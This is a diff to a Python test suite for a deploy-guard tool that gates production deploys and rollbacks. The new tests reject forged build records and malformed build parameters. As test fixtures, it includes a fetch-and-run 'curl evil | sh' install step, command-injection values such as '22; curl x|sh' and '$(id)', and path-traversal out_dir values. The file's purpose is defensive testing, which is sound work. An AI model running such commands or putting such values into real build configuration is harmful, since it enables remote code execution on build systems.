@@ -18,7 +18,8 @@ BUILD_B = {**BUILD_A, "node": "22", "out_dir": "build"}
 def ctx(**kw):
     c = {"sha": B, "reason": "deploy", "env": "production", "on_main": True, "ci": "success",
          "live_sha": A, "newer_than_live": True, "ledger_success_shas": [A], "freezes": [],
-         "pr": 12, "pr_labels": [], "now": "2026-10-01T00:00:00Z", "has_drill_alias": True}
+         "pr": 12, "pr_labels": [], "now": "2026-10-01T00:00:00Z", "has_drill_alias": True,
+         "current_build": BUILD_B, "live_build": BUILD_A, "target_build": BUILD_A}
     c.update(kw)
     return c
 
@@ -115,8 +116,10 @@ class Ledger(unittest.TestCase):
 class RecordedBuild(unittest.TestCase):
     """Rollback rebuilds the target with the params it deployed with, never the failed deploy's."""
 
-    def dep(self, sha, state, payload=None):
-        return {"sha": sha, "state": state, "created_at": "", "payload": payload or {}}
+    BOT = {"login": "github-actions[bot]", "type": "Bot"}
+
+    def dep(self, sha, state, payload=None, creator=None):
+        return {"sha": sha, "state": state, "created_at": "", "payload": payload or {}, "creator": self.BOT if creator is None else creator}
 
     def test_deployment_request_carries_the_build_params(self):
         r = deployment_request(A, "production", "deploy", "https://run", build=BUILD_A)
@@ -142,7 +145,6 @@ class RecordedBuild(unittest.TestCase):
         self.assertNotIn("\n", d["prev_build"])  # one line: it goes through $GITHUB_OUTPUT
 
     def test_decide_without_recorded_params_says_so(self):
-        self.assertEqual(decide(ctx())["prev_build"], "")
         self.assertEqual(decide(ctx(live_build=None))["prev_build"], "")
         self.assertEqual(decide(ctx(ci="failure", live_build=BUILD_A))["prev_build"], "")
 
@@ -185,9 +187,136 @@ class RecordedBuild(unittest.TestCase):
 
     def test_record_cli_rejects_malformed_params(self):
         for bad in ("not json", "[]", json.dumps({"node": "20"})):
-            with self.subTest(bad=bad), contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit):
+            with self.subTest(bad=bad), contextlib.redirect_stderr(io.StringIO()), \
+                    mock.patch.object(deploy_guard, "gh", side_effect=AssertionError("validation must run before any gh call")), \
+                    self.assertRaises(SystemExit):
                 deploy_guard.main(["record", "--repo", "o/r", "--sha", B, "--env", "production", "--reason", "deploy",
                                    "--url", "", "--run-url", "", "--state", "success", "--build-json", bad])
+
+    # --- fix round 1: trust, destination pinning, shape checks, the manual rollback path ---
+    def test_records_by_anyone_but_the_gates_bot_are_not_trusted(self):
+        forged = {"build": {**BUILD_A, "install": "curl evil | sh"}}
+        for who in ({"login": "mallory", "type": "User"}, {"login": "github-actions[bot]", "type": "User"},
+                    {"login": "cloudflare-pages[bot]", "type": "Bot"}, {}, None):
+            with self.subTest(who=who):
+                self.assertIsNone(recorded_build([self.dep(A, "success", forged, who or {})], A))
+                d = decide(ctx(live_build=recorded_build([self.dep(A, "success", forged, who or {})], A)))
+                self.assertEqual(d["prev_build"], "")
+
+    def test_a_forged_newer_record_does_not_shadow_the_trusted_one(self):
+        deps = [self.dep(A, "success", {"build": {**BUILD_A, "install": "evil"}}, {"login": "mallory", "type": "User"}),
+                self.dep(A, "success", {"build": BUILD_A})]
+        self.assertEqual(recorded_build(deps, A), BUILD_A)
+
+    def test_ledger_reads_the_creator_and_tolerates_odd_payloads(self):
+        def fake(path):
+            if "/statuses" in path:
+                return [{"state": "success"}]
+            return [{"id": 1, "sha": A, "created_at": "t", "payload": "[1]", "creator": {"login": "github-actions[bot]", "type": "Bot"}},
+                    {"id": 2, "sha": B, "created_at": "t", "payload": "not json", "creator": None},
+                    {"id": 3, "sha": C, "created_at": "t", "payload": ["x"]},
+                    {"id": 4, "sha": C, "created_at": "t", "payload": json.dumps({"build": BUILD_A}),
+                     "creator": {"login": "github-actions[bot]", "type": "Bot"}}]
+        with mock.patch.object(deploy_guard, "gh_json", fake):
+            deps = deploy_guard.ledger("o/r", "production")
+        self.assertEqual([d["payload"] for d in deps[:3]], [{}, {}, {}])
+        self.assertEqual(deps[0]["creator"], self.BOT)
+        self.assertEqual(recorded_build(deps, C), BUILD_A)
+        self.assertEqual(decide(ctx(live_sha=A, live_build=recorded_build(deps, A)))["prev_build"], "")  # no crash
+
+    def test_ledger_can_query_one_sha(self):
+        seen = []
+        with mock.patch.object(deploy_guard, "gh_json", lambda p: seen.append(p) or []):
+            deploy_guard.ledger("o/r", "production", 20, A)
+        self.assertIn(f"sha={A}", seen[0])
+
+    def test_a_different_kind_or_project_disarms_the_rollback(self):
+        for k, v in (("kind", "worker"), ("cf_project", "other-clients-project")):
+            with self.subTest(k=k):
+                d = decide(ctx(live_build={**BUILD_A, k: v}, current_build=BUILD_A))
+                self.assertEqual((d["go"], d["prev_build"]), (True, ""))
+                self.assertIn("different " + k, d["warning"])
+                r = decide(ctx(reason="rollback", target_build={**BUILD_A, k: v}, current_build=BUILD_A))
+                self.assertFalse(r["go"])
+                self.assertEqual(r["ship_build"], "")
+
+    def test_node_and_out_dir_shapes_are_checked(self):
+        for k, v in (("node", "22; curl x|sh"), ("node", ""), ("node", "$(id)"), ("out_dir", "/etc"), ("out_dir", "../x"),
+                     ("out_dir", "a/../../x"), ("out_dir", "a b"), ("out_dir", "$HOME"), ("kind", "lambda")):
+            with self.subTest(k=k, v=v):
+                self.assertNotEqual(deploy_guard.build_problem({**BUILD_A, k: v}, BUILD_A), "")
+        for k, v in (("node", "22"), ("node", "20.11.1"), ("node", "20.x"), ("node", "lts/*"), ("node", "lts/iron"),
+                     ("out_dir", ""), ("out_dir", "dist"), ("out_dir", "apps/web/.output/public"), ("out_dir", ".")):
+            with self.subTest(ok=(k, v)):
+                self.assertEqual(deploy_guard.build_problem({**BUILD_A, k: v}, BUILD_A), "")
+
+    def test_auto_rollback_target_without_params_is_not_announced(self):
+        d = decide(ctx(live_build=None))
+        self.assertTrue(d["go"])
+        self.assertEqual((d["prev_sha"], d["prev_build"]), (A, ""))
+        self.assertNotIn("auto-rollback target", d["message"])
+        self.assertIn("DISARMED", d["message"])
+        self.assertIn("auto-rollback disarmed", d["warning"])
+        self.assertIn("auto-rollback target", decide(ctx())["message"])
+
+    def test_normal_deploys_ship_the_current_inputs(self):
+        d = decide(ctx(current_build=BUILD_B, live_build=BUILD_A))
+        self.assertEqual(json.loads(d["ship_build"]), BUILD_B)
+        self.assertEqual(json.loads(d["prev_build"]), BUILD_A)
+
+    def test_manual_rollback_ships_the_targets_recorded_params_not_current_inputs(self):
+        d = decide(ctx(reason="rollback", sha=A, live_sha=B, current_build=BUILD_A, target_build=BUILD_A))
+        self.assertTrue(d["go"])
+        self.assertEqual(json.loads(d["ship_build"]), BUILD_A)
+        # the failed change moved node/out_dir; the caller's current inputs differ but the target's win
+        newer = {**BUILD_A, "node": "18", "out_dir": "public"}
+        d = decide(ctx(reason="rollback", sha=A, live_sha=B, current_build=BUILD_B, target_build=newer))
+        self.assertEqual(json.loads(d["ship_build"]), newer)
+
+    def test_manual_rollback_without_a_record_refuses_loudly(self):
+        d = decide(ctx(reason="rollback", target_build=None))
+        self.assertFalse(d["go"])
+        self.assertEqual(d["ship_build"], "")
+        self.assertTrue(d["message"].startswith("refused: no recorded build params for bbbbbbb; manual rollback needed"))
+
+    def test_gather_looks_up_the_rollback_targets_own_records(self):
+        calls = []
+
+        def fake_ledger(repo, env, n=20, sha=""):
+            calls.append(sha)
+            return [self.dep(A, "success", {"build": BUILD_A})] if sha in ("", A) else []
+        fakes = {"gh": lambda *a, **k: A, "now": lambda: "t", "ledger": fake_ledger, "pr_of": lambda *a: (None, []),
+                 "ancestor_or_equal": lambda *a: True, "ci_state": lambda *a: "success", "open_freezes": lambda *a: []}
+        with contextlib.ExitStack() as st:
+            for k, v in fakes.items():
+                st.enter_context(mock.patch.object(deploy_guard, k, v))
+            c = deploy_guard.gather("o/r", A, "rollback", "production", False, True, BUILD_B)
+        self.assertEqual(c["target_build"], BUILD_A)
+        self.assertEqual(c["current_build"], BUILD_B)
+        self.assertIn(A, calls)
+
+    def test_decide_cli_takes_the_current_build(self):
+        out = io.StringIO()
+        with mock.patch.object(deploy_guard, "gather", lambda *a: ctx()), contextlib.redirect_stdout(out):
+            deploy_guard.main(["decide", "--repo", "o/r", "--sha", B, "--reason", "deploy", "--env", "production",
+                               "--current-build", json.dumps(BUILD_B)])
+        self.assertEqual(json.loads(json.loads(out.getvalue())["ship_build"]), BUILD_B)
+
+    def test_freeze_text_is_truthful_when_nothing_was_rolled_back(self):
+        made = []
+
+        def fake_gh(*args, stdin=None):
+            made.append(args)
+            return "https://github.com/BJGLLC/r/issues/9"
+        a = types.SimpleNamespace(repo="BJGLLC/r", env="production", frm=B, to=A, run_url="https://run", state="smoke-failed-no-target")
+        with mock.patch.object(deploy_guard, "gh", fake_gh):
+            deploy_guard.freeze_open(a)
+        issue = next(c for c in made if c[:2] == ("issue", "create"))
+        title, body = issue[issue.index("--title") + 1], issue[issue.index("--body") + 1]
+        self.assertIn("[production]", title)
+        self.assertNotIn("rolled back from", title)
+        self.assertIn("NOT rolled back", body)
+        self.assertIn("still live", body)
 
 
 class FreezeOpen(unittest.TestCase):
